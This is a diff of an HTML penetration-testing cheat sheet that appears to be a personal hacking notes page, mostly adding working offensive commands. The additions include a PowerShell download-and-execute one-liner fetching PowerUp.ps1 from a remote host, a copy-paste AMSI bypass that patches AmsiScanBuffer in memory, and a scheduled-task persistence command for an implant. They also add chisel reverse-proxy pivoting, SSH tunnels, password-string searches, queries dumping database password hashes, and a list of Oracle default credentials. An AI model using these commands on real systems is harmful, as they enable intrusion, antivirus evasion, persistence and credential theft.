@@ -201,6 +201,10 @@
 <td>Host discovery on a network, better for windows as sometimes ICMP ping packets are dropped</td>
 </tr>
 <tr>
+<td><code>for i in $(seq 1 254); do (ping -c 1 10.2.2.${i} | grep &quot;bytes from&quot; &amp;); done;</code></td>
+<td>Living of the Land host enum</td>
+</tr>
+<tr>
 <td><code>nmap -R -sL -dns-server &lt;server&gt; x.x.x.0/24</code></td>
 <td>DNS reverse lookup on IP range</td>
 </tr>
@@ -241,8 +245,8 @@
 <td>SMB connect</td>
 </tr>
 <tr>
-<td><code>smbmap -H &lt;IP&gt;</code></td>
-<td>List SMB shares</td>
+<td><code>smbmap -H &lt;IP&gt; -R</code></td>
+<td>Recursively list all SMB shares and subfolders</td>
 </tr>
 <tr>
 <td><code>enum4linux -a &lt;IP&gt;</code></td>
@@ -411,6 +415,10 @@
 <tr>
 <td><code>ssh -R &lt;anyPort&gt;:localhost:22 username@target</code> Then <code>ssh username@localhost -p&lt;port&gt;</code></td>
 <td>Reverse Reverse port forward (Allows you to ssh out of a machine that is blocked from external ssh access)</td>
+</tr>
+<tr>
+<td><code>ssh -L 9090:127.0.0.1:9090 dennis@192.168.22.100</code></td>
+<td>port forward internal port</td>
 </tr>
 <tr>
 <td><code>echo &quot;nameserver x.x.x.x &gt; /etc/resolv.conf&quot;</code></td>
@@ -680,6 +688,10 @@
 <td><code>nbtscan &lt;IP_addr&gt;</code></td>
 <td>NBT scan / enumerate NetBios (ports 137, 138, 139)</td>
 </tr>
+<tr>
+<td><code>sslscan &lt;hostname/ip&gt;</code></td>
+<td>TLS/SSL check - look for vulnerable versions or potential for downgrade attacks, insecure ciphers etc.</td>
+</tr>
 </tbody>
 </table>
 <h2 id="linux-exploits">Linux exploits<a href="#linux-exploits" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
@@ -940,8 +952,12 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 <td>Download file</td>
 </tr>
 <tr>
-<td><code>_IEX_(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1')</code></td>
+<td><code>IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1')</code></td>
 <td>Download file</td>
+</tr>
+<tr>
+<td><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1'); Invoke-AllChecks&quot;</code></td>
+<td>Loads powershell script straight into memory</td>
 </tr>
 <tr>
 <td><code>powershell -nop -ep bypass</code></td>
@@ -952,11 +968,15 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 <td>Convert file to base64 for file transfer (copy b64 output and decode on your local kali machine)</td>
 </tr>
 <tr>
+<td><code>[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;base64String&quot;))</code></td>
+<td>Convert from base64 (take base64 input and decode it on the server for file transfer)</td>
+</tr>
+<tr>
 <td><code>netstat -ano</code></td>
 <td>Port scan, same as <code>netstat -tunlp</code></td>
 </tr>
 <tr>
-<td><code>sc query</code> <code>net start</code> <code>wmic service get name,startname</code> <code>Get-Service</code> OR <code>Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}</code></td>
+<td><code>sc query</code> <code>net start</code> <code>wmic service get name,startname</code> <code>Get-Service</code> OR <code>Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}</code> OR <code>services</code></td>
 <td>List all services on the machine (good for finding a service for CLSIDs)</td>
 </tr>
 <tr>
@@ -1019,9 +1039,59 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 <td><code>nbtstat -A &lt;IP_addr&gt;</code></td>
 <td>Retrieve NetBios name of remote host (01 and 1D indicate the master browser, 03 is the user)</td>
 </tr>
+<tr>
+<td><code>findstr /spin &quot;password&quot; *.*</code></td>
+<td>Find the string password in all file types</td>
+</tr>
+<tr>
+<td><code>Import-Module &lt;module i.e PowerUp.ps1&gt;</code></td>
+<td>Import powershell scrips to enhance powershell functionality</td>
+</tr>
+<tr>
+<td><code>SCHTASKS /CREATE /SC ONSTART /TN &quot;MyTasks\PERSISTENCE&quot; /TR &quot;c:\windows\temp\implant.exe</code></td>
+<td>Create a scheduled task for persistence (HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.)</td>
+</tr>
+<tr>
+<td><code>ldapdomaindump 192.168.151.175 -u &lt;username&gt; -p &lt;password&gt;</code></td>
+<td>dump ldap</td>
+</tr>
+<tr>
+<td><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></td>
+<td></td>
+</tr>
 </tbody>
 </table>
-<h2 id="ldap-enumeration">LDAP enumeration<a href="#ldap-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="bypass-amsii">Bypass Amsii<a href="#bypass-amsii" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Just copy and paste this entire block into powershell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$Win32 = <span style="color:#e6db74">@&#34;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">using System;
+</span><span style="color:#e6db74">using System.Runtime.InteropServices;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">public class Win32 {
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    [DllImport(&#34;kernel32&#34;)]
+</span><span style="color:#e6db74">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    [DllImport(&#34;kernel32&#34;)]
+</span><span style="color:#e6db74">    public static extern IntPtr LoadLibrary(string name);
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    [DllImport(&#34;kernel32&#34;)]
+</span><span style="color:#e6db74">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">&#34;@</span>
+
+Add-Type $Win32
+
+$LoadLibrary = <span style="color:#66d9ef">[Win32]</span>::LoadLibrary(<span style="color:#e6db74">&#34;am&#34;</span> + <span style="color:#e6db74">&#34;si.dll&#34;</span>)
+$Address = <span style="color:#66d9ef">[Win32]</span>::GetProcAddress($LoadLibrary, <span style="color:#e6db74">&#34;Amsi&#34;</span> + <span style="color:#e6db74">&#34;Scan&#34;</span> + <span style="color:#e6db74">&#34;Buffer&#34;</span>)
+$p = 0
+<span style="color:#66d9ef">[Win32]</span>::VirtualProtect($Address, <span style="color:#66d9ef">[uint32]5, 0x40, [ref]</span>$p)
+$Patch = <span style="color:#66d9ef">[Byte[]]</span> (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+<span style="color:#66d9ef">[System.Runtime.InteropServices.Marshal]</span>::Copy($Patch, 0, $Address, 6)
+
+</code></pre></div><h2 id="ldap-enumeration">LDAP enumeration<a href="#ldap-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ldap3
 
 server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">&#39;10.10.11.152&#39;</span>, port <span style="color:#f92672">=</span><span style="color:#ae81ff">389</span>)
@@ -1225,6 +1295,10 @@ print(server<span style="color:#f92672">.</span>info)
 <td><code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;ServicePrincipalName&quot; #Example: MSSQLSvc/mgmt.domain.local </code></td>
 <td>Get TGS in memory</td>
 </tr>
+<tr>
+<td><code>nltest /domain_trusts</code></td>
+<td>view domain trusts</td>
+</tr>
 </tbody>
 </table>
 <p>Checking permissions of the processes binaries</p>
@@ -1240,7 +1314,68 @@ print(server<span style="color:#f92672">.</span>info)
 	icacls <span style="color:#e6db74">&#34;%%~dpy\&#34;</span> 2&gt;nul | findstr /i <span style="color:#e6db74">&#34;(F) (M) (W) :\\&#34;</span> | findstr /i <span style="color:#e6db74">&#34;:\\ everyone authenticated users 
 </span><span style="color:#e6db74">todos %username%&#34;</span> &amp;&amp; echo.
 )
-</code></pre></div><h1 id="webapp">Webapp<a href="#webapp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+</code></pre></div><h1 id="chisel">Chisel<a href="#chisel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Scenario: you&rsquo;ve compromised a host and you are trying to pivot further into the internal network to machines that are not internet facing. What do you do? create a reverse socks proxy connection with chisel between your kali and the compromised host to forward traffic to the interna network. This way you can nmap/ rdp into internal hosts straight from your kali!!!!</p>
+<p>make sure to include this line in <code>/etc/proxychains4.conf</code></p>
+<pre tabindex="0"><code>socks5          127.0.0.1 1080
+</code></pre><table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>chisel.exe server -p 8000 -socks5 -reverse</code></td>
+<td>Set up &ldquo;server&rdquo; on your kali</td>
+</tr>
+<tr>
+<td><code>chisel64.exe client 192.168.22.2:8000 R:1080:socks </code></td>
+<td>connect back to server from the compromised host</td>
+</tr>
+<tr>
+<td><code>proxychains nmap -p 1-1000 -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output</code></td>
+<td>speed up nmap through proxychains</td>
+</tr>
+<tr>
+<td><code>seq 1 1000 | xargs -P 50 -I{} proxychains -q nmap -p {} -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output</code></td>
+<td>really fing fast nmap through proxy chains</td>
+</tr>
+<tr>
+<td><code>grep open/tcp proxychains_nmap | sort | uniq | awk {'print($5)};' | cut -d &quot;/&quot; -f 1,3,5 | sort -n</code></td>
+<td>grep output for the open ports</td>
+</tr>
+</tbody>
+</table>
+<h2 id="how-does-chisel-work">How does chisel work?<a href="#how-does-chisel-work" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>good question&hellip;</li>
+</ul>
+<h2 id="other-tunneling-commands">Other tunneling commands<a href="#other-tunneling-commands" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ssh -L 127.0.0.1:1234:10.10.10.5:3389 user@10.10.2.30</code></td>
+<td>SSH port forward. Use this to forward packets from <code>127.0.0.1:1234</code> to <code>10.10.10.5:3389</code> via <code>10.10.2.30</code>  Now you can RDP into the box with the address <code>127.0.0.1:3389</code></td>
+</tr>
+<tr>
+<td><code>ssh -D 1080 yourlab@10.10.2.30</code></td>
+<td>SSH Socks proxy. Make sure to configure <code>/etc/proxychains4.conf</code> like with chisel. Now just run <code>proxychains &lt;yourcommand&gt; </code></td>
+</tr>
+<tr>
+<td><code>ssh -L 9090:127.0.0.1:9090 user@192.168.22.100</code></td>
+<td>Remote/Reverse port forward. Forward traffic from port 9090 on the internal network to 9090 on your localhost.</td>
+</tr>
+</tbody>
+</table>
+<h1 id="webapp">Webapp<a href="#webapp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <h2 id="xss">XSS<a href="#xss" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <table>
 <thead>
@@ -1451,6 +1586,9 @@ print(server<span style="color:#f92672">.</span>info)
 </table>
 <h1 id="databases">Databases<a href="#databases" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <h2 id="mysql">MySQL<a href="#mysql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>port 3306</li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -1483,9 +1621,16 @@ print(server<span style="color:#f92672">.</span>info)
 <td><code>mysql.user</code></td>
 <td>password hashes location</td>
 </tr>
+<tr>
+<td><code>SELECT * FROM mysql.user*</code></td>
+<td>Password hashes</td>
+</tr>
 </tbody>
 </table>
 <h2 id="postgresql">PostgreSQL<a href="#postgresql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>port 5432</li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -1572,8 +1717,9 @@ msf&gt; use exploit/linux/postgres/postgres_payload
 msf&gt; use exploit/windows/postgres/postgres_payload
 </code></pre></div><h2 id="mssql">MSSQL<a href="#mssql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <ul>
-<li>port TCP/1433, TCP/2433</li>
-<li>TCP/1434 Named instance</li>
+<li>TCP/1433 - SQL server port</li>
+<li>TCP/2433 - Hidden mode</li>
+<li>TCP/1434 Named instance - Monitor port</li>
 <li>UDP/1434 SQL Server Browse</li>
 <li>Password hashes are stored in <code>master.dbo.sysxlogins</code></li>
 </ul>
@@ -1605,8 +1751,33 @@ msf&gt; use exploit/windows/postgres/postgres_payload
 <td><code>SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable');</code></td>
 <td>List columns</td>
 </tr>
+<tr>
+<td><code>EXEC sp_databases</code></td>
+<td>Show database instances</td>
+</tr>
+<tr>
+<td><code>EXEC sp_helpdm &lt;dbname&gt;</code></td>
+<td>Show database description</td>
+</tr>
+<tr>
+<td><code>USE &lt;database name&gt;</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>EXEC sp_tables</code></td>
+<td>Show tables</td>
+</tr>
+<tr>
+<td><code>SELECT name, password FROM Maste.dbo.sysxlogins</code></td>
+<td>Show password hases</td>
+</tr>
 </tbody>
 </table>
+<p>Default accounts</p>
+<ul>
+<li>SQL 2000 = SA user, blank password</li>
+<li>SQL 2005 = SA user, password not set</li>
+</ul>
 <h2 id="oracle-db">Oracle DB<a href="#oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <ul>
 <li>Port 1521</li>
@@ -1661,10 +1832,61 @@ msf&gt; use exploit/windows/postgres/postgres_payload
 <td>SELECT name, password, astatus FROM sys.user$;</td>
 <td>List password hashes</td>
 </tr>
+<tr>
+<td>SELECT username, password FROM dba_users</td>
+<td>Show databse user/password</td>
+</tr>
+<tr>
+<td>SELECT name, password FROM SYS.USER$</td>
+<td>Shows passwords in DES hash</td>
+</tr>
+<tr>
+<td>SELECT name, spare4 FROM SYS.USER$</td>
+<td>Show passwords in SHA-1</td>
+</tr>
+</tbody>
+</table>
+<h3 id="default-accounts">Default accounts<a href="#default-accounts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SYS</td>
+<td>CHANGE_ON_INSTALL</td>
+</tr>
+<tr>
+<td>SYSTEM</td>
+<td>MANAGER</td>
+</tr>
+<tr>
+<td>DBSNMP</td>
+<td>DBSNMP</td>
+</tr>
+<tr>
+<td>SYSADM</td>
+<td>SYSADM</td>
+</tr>
+<tr>
+<td>SCOTT</td>
+<td>TIGER</td>
+</tr>
+<tr>
+<td>OUTLN</td>
+<td>OUTLN</td>
+</tr>
+<tr>
+<td>MDSYS</td>
+<td>MDSYS</td>
+</tr>
 </tbody>
 </table>
 <h3 id="connect-to-oracle-db">Connect to Oracle DB<a href="#connect-to-oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<h4 id="windows-1">WIndows<a href="#windows-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<h4 id="windows-1">Windows<a href="#windows-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <pre tabindex="0"><code>CONNECT username/password@&lt;IP&gt;:&lt;PORT&gt;
 </code></pre><h4 id="linux-1">Linux<a href="#linux-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export ORACLE_HOME<span style="color:#f92672">=</span>/path/to/oracle/home 			<span style="color:#75715e">#usually /usr/lib/oracle/&lt;version&gt;/client64/</span>
